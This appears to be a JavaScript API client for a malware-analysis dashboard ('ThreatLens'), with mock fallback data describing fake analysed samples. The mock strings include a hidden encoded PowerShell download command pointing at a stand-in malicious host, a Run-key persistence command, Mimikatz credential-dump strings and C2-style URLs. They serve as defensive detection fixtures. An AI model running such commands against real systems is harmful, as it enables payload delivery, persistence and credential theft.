const API_BASE = '/api/v1';

// Token storage helpers
export function getStoredToken() {
  return localStorage.getItem('threatlens_token');
}

export function setStoredToken(token) {
  if (token) {
    localStorage.setItem('threatlens_token', token);
  } else {
    localStorage.removeItem('threatlens_token');
  }
}

export function getAuthHeaders() {
  const token = getStoredToken();
  return token ? { 'Authorization': `Bearer ${token}` } : {};
}

// -------------------------------------------------------------
// Authentication API
// -------------------------------------------------------------

export async function loginUser(username_or_email, password) {
  try {
    const res = await fetch(`${API_BASE}/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username_or_email, password }),
    });

    if (!res.ok) {
      const errData = await res.json().catch(() => ({}));
      throw new Error(errData.detail || 'Authentication failed');
    }

    const data = await res.json();
    setStoredToken(data.access_token);
    return data;
  } catch (err) {
    console.warn('Real Auth API call failed, attempting fallback mock:', err);
    throw err;
  }
}

export async function fetchCurrentUser() {
  try {
    const res = await fetch(`${API_BASE}/auth/me`, {
      headers: {
        ...getAuthHeaders(),
      },
    });
    if (!res.ok) throw new Error('Failed to fetch user profile');
    return await res.json();
  } catch (err) {
    console.warn('Fetch current user error:', err);
    return null;
  }
}

// -------------------------------------------------------------
// Dashboard & Files API
// -------------------------------------------------------------

export async function fetchDashboardStats() {
  try {
    const res = await fetch(`${API_BASE}/dashboard/stats`, {
      headers: {
        ...getAuthHeaders(),
      },
    });
    if (!res.ok) throw new Error('API Error');
    return await res.json();
  } catch (err) {
    console.warn('Backend API unavailable, using local fallback stats:', err);
    return {
      total_scans: 4,
      completed_scans: 4,
      malicious_threats: 2,
      yara_matches: 3,
      avg_risk_score: 54.3,
      system_status: 'Operational',
      active_rules: 48,
      ai_model_accuracy: 96.4
    };
  }
}

export async function fetchFileList() {
  try {
    const res = await fetch(`${API_BASE}/files`, {
      headers: {
        ...getAuthHeaders(),
      },
    });
    if (!res.ok) throw new Error('API Error');
    return await res.json();
  } catch (err) {
    console.warn('Backend API unavailable, using local mock file list:', err);
    return [
      {
        id: 1,
        filename: "invoice.exe",
        file_path: "uploads/invoice.exe",
        file_size: 245800,
        md5_hash: "5d41402abc4b2a76b9719d911017c592",
        sha256_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        file_type: "PE32 Executable (GUI) Intel 80386, for MS Windows",
        status: "completed",
        uploaded_at: new Date(Date.now() - 3600000).toISOString(),
        analysis_result: {
          risk_score: 82,
          threat_classification: "Trojan.Generic / Downloader",
          recommended_action: "Quarantine file and isolate source endpoint",
          ml_prediction: "Malware",
          ml_confidence: 0.948
        },
        yara_results: [
          { id: 1, rule_name: "Suspicious_PowerShell_Execution", severity: "high", tags: ["trojan", "downloader"] }
        ]
      },
      {
        id: 2,
        filename: "payload_sample.dll",
        file_path: "uploads/payload_sample.dll",
        file_size: 1048576,
        md5_hash: "098f6bcd4621d373cade4e832627b4f6",
        sha256_hash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        file_type: "PE32+ Executable DLL (console) x86-64",
        status: "completed",
        uploaded_at: new Date(Date.now() - 7200000).toISOString(),
        analysis_result: {
          risk_score: 95,
          threat_classification: "CredentialStealer.MimikatzVariant",
          recommended_action: "Immediate quarantine & initiate credential revocation",
          ml_prediction: "Malware",
          ml_confidence: 0.982
        },
        yara_results: [
          { id: 3, rule_name: "Mimikatz_Credential_Dump", severity: "critical", tags: ["credential_dump", "lsass"] }
        ]
      },
      {
        id: 3,
        filename: "quarterly_report.pdf",
        file_path: "uploads/quarterly_report.pdf",
        file_size: 512000,
        md5_hash: "1b3231655cebb7a1f783eddf27d254ca",
        sha256_hash: "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
        file_type: "PDF Document (Adobe Acrobat v1.7)",
        status: "completed",
        uploaded_at: new Date(Date.now() - 86400000).toISOString(),
        analysis_result: {
          risk_score: 5,
          threat_classification: "Clean Document",
          recommended_action: "No action needed (Allow file)",
          ml_prediction: "Benign",
          ml_confidence: 0.995
        },
        yara_results: []
      }
    ];
  }
}

export async function fetchFileDetail(id) {
  try {
    const res = await fetch(`${API_BASE}/files/${id}`, {
      headers: {
        ...getAuthHeaders(),
      },
    });
    if (!res.ok) throw new Error('API Error');
    return await res.json();
  } catch (err) {
    console.warn(`Backend API unavailable, using local mock file detail for ID ${id}:`, err);
    return {
      id: Number(id),
      filename: id == 2 ? "payload_sample.dll" : (id == 3 ? "quarterly_report.pdf" : "invoice.exe"),
      file_path: id == 2 ? "uploads/payload_sample.dll" : (id == 3 ? "uploads/quarterly_report.pdf" : "uploads/invoice.exe"),
      file_size: id == 2 ? 1048576 : (id == 3 ? 512000 : 245800),
      md5_hash: id == 2 ? "098f6bcd4621d373cade4e832627b4f6" : "5d41402abc4b2a76b9719d911017c592",
      sha256_hash: id == 2 ? "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08" : "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      file_type: id == 2 ? "PE32+ Executable DLL (console) x86-64, for MS Windows" : (id == 3 ? "PDF Document (Adobe Acrobat v1.7)" : "PE32 Executable (GUI) Intel 80386, for MS Windows"),
      status: "completed",
      uploaded_at: new Date().toISOString(),
      analysis_result: id == 2 ? {
        id: 2,
        file_id: 2,
        pe_headers: { entry_point: "0x10001200", number_of_sections: 4, sections: [".text", ".data", ".rsrc", ".reloc"], subsystem: "Windows DLL", image_base: "0x10000000" },
        extracted_strings: ["mimikatz", "sekurlsa::logonpasswords", "lsass.exe", "OpenProcessToken", "AdjustTokenPrivileges"],
        suspicious_apis: ["Kernel32.dll -> OpenProcess", "Advapi32.dll -> AdjustTokenPrivileges", "Advapi32.dll -> LookupPrivilegeValueA"],
        network_indicators: { urls: [], ips: ["103.253.144.10"] },
        risk_score: 95,
        threat_classification: "CredentialStealer.MimikatzVariant",
        recommended_action: "Immediate quarantine & initiate credential revocation",
        ml_prediction: "Malware",
        ml_confidence: 0.982,
        created_at: new Date().toISOString()
      } : (id == 3 ? {
        id: 3,
        file_id: 3,
        pe_headers: null,
        extracted_strings: ["Adobe Acrobat Reader", "Annual Financial Overview", "Confidential Internal Use"],
        suspicious_apis: [],
        network_indicators: { urls: ["https://company-portal.internal/reports"], ips: [] },
        risk_score: 5,
        threat_classification: "Clean Document",
        recommended_action: "No action needed (Allow file)",
        ml_prediction: "Benign",
        ml_confidence: 0.995,
        created_at: new Date().toISOString()
      } : {
        id: 1,
        file_id: 1,
        pe_headers: {
          entry_point: "0x00401000",
          number_of_sections: 5,
          sections: [".text", ".rdata", ".data", ".rsrc", ".reloc"],
          subsystem: "Windows GUI",
          image_base: "0x00400000",
          compile_timestamp: "2026-03-14 10:22:15"
        },
        extracted_strings: [
          "powershell.exe -ExecutionPolicy Bypass -W Hidden -enc aHR0cHM6Ly9tYWxpY2lvdXMtc2l0ZS5jb20vcGF5bG9hZC5wc2E=",
          "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MalUpdate",
          "WScript.Shell",
          "CreateProcessA",
          "VirtualAllocEx",
          "WriteProcessMemory"
        ],
        suspicious_apis: [
          "Kernel32.dll -> VirtualAlloc",
          "Kernel32.dll -> WriteProcessMemory",
          "Kernel32.dll -> CreateRemoteThread",
          "Advapi32.dll -> RegSetValueExA",
          "Urlmon.dll -> URLDownloadToFileA"
        ],
        network_indicators: {
          urls: ["http://malicious-site.com/payload.ps1", "https://command-and-control-server.xyz/gate.php"],
          ips: ["185.220.101.5", "192.0.2.14"]
        },
        risk_score: 82,
        threat_classification: "Trojan.Generic / Downloader",
        recommended_action: "Quarantine file and isolate source endpoint",
        ml_prediction: "Malware",
        ml_confidence: 0.948,
        created_at: new Date().toISOString()
      }),
      yara_results: id == 2 ? [
        { id: 3, file_id: 2, rule_name: "Mimikatz_Credential_Dump", severity: "critical", tags: ["credential_dump", "mimikatz"], matched_strings: ["$str1 = sekurlsa::logonpasswords"], matched_at: new Date().toISOString() }
      ] : (id == 3 ? [] : [
        { id: 1, file_id: 1, rule_name: "Suspicious_PowerShell_Execution", severity: "high", tags: ["trojan", "downloader", "powershell"], matched_strings: ["$s1 = powershell.exe -ExecutionPolicy Bypass", "$s2 = URLDownloadToFileA"], matched_at: new Date().toISOString() },
        { id: 2, file_id: 1, rule_name: "Persistence_Registry_Modification", severity: "medium", tags: ["persistence", "registry"], matched_strings: ["$reg = Software\\Microsoft\\Windows\\CurrentVersion\\Run"], matched_at: new Date().toISOString() }
      ])
    };
  }
}

// -------------------------------------------------------------
// AI Prediction API
// -------------------------------------------------------------

export async function fetchPredictionReport(fileId) {
  try {
    const res = await fetch(`${API_BASE}/predictions/${fileId}/report`, {
      headers: {
        ...getAuthHeaders(),
      },
    });
    if (!res.ok) {
      const errData = await res.json().catch(() => ({}));
      throw new Error(errData.detail || 'Failed to fetch AI prediction report');
    }
    return await res.json();
  } catch (err) {
    console.warn('Backend Prediction API unavailable, using local mock structured report:', err);
    const isClean = fileId == 3;
    const isCrit = fileId == 2;
    
    return {
      report_metadata: {
        generated_at: new Date().toISOString(),
        report_type: "AI Threat Prediction Report",
        system: "ThreatLens AI Dual-Engine"
      },
      file_information: {
        filename: isCrit ? "payload_sample.dll" : (isClean ? "quarterly_report.pdf" : "invoice.exe"),
        sha256_hash: isCrit ? "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08" : "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      },
      ml_analysis: {
        prediction: isClean ? "Benign" : "Malware",
        confidence: isCrit ? 0.982 : (isClean ? 0.995 : 0.948)
      },
      behavioral_analysis: {
        behavior_count: isClean ? 0 : (isCrit ? 4 : 3),
        behavior_score: isClean ? 0 : (isCrit ? 95 : 82),
        critical_findings: isCrit ? 2 : 0,
        high_findings: isCrit ? 1 : 2,
        medium_findings: isCrit ? 1 : 1,
        low_findings: 0,
        findings: isClean ? [] : (isCrit ? [
          {
            behavior: "Credential Dumping",
            severity: "Critical",
            confidence: 0.98,
            evidence: ["sekurlsa::logonpasswords string match", "OpenProcess call to lsass.exe"],
            description: "Binary contains explicit logic and API sequences known to harvest credentials from memory."
          },
          {
            behavior: "Process Memory Manipulation",
            severity: "High",
            confidence: 0.94,
            evidence: ["VirtualAlloc", "WriteProcessMemory imports"],
            description: "Allocates and writes executable memory in external target processes."
          }
        ] : [
          {
            behavior: "Suspicious PowerShell Downloader",
            severity: "High",
            confidence: 0.95,
            evidence: ["powershell.exe -ExecutionPolicy Bypass", "URLDownloadToFileA import"],
            description: "Spawns hidden PowerShell processes to download remote secondary payloads."
          },
          {
            behavior: "Persistence Installation",
            severity: "Medium",
            confidence: 0.88,
            evidence: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key modification"],
            description: "Establishes persistence to survive system reboot."
          }
        ])
      },
      threat_assessment: {
        final_threat_score: isClean ? 5 : (isCrit ? 95 : 82),
        threat_level: isClean ? "Low" : (isCrit ? "Critical" : "High"),
        threat_category: isClean ? "Benign Document" : (isCrit ? "Credential Stealer / Mimikatz" : "Trojan Downloader")
      },
      response: {
        recommended_action: isClean ? "No action required (Safe file)" : (isCrit ? "Immediate quarantine and credential rotation" : "Quarantine sample and inspect endpoint activity")
      },
      security_summary: isClean 
        ? "No significant malicious behavioral evidence or threat indicators were detected. The file is considered benign."
        : (isCrit 
          ? "The analyzed sample presents a critical threat. Critical credential access and memory manipulation behaviors were detected with 98.2% AI confidence." 
          : "The analyzed sample presents high malicious threat probability with confirmed downloader patterns and persistence mechanisms.")
    };
  }
}
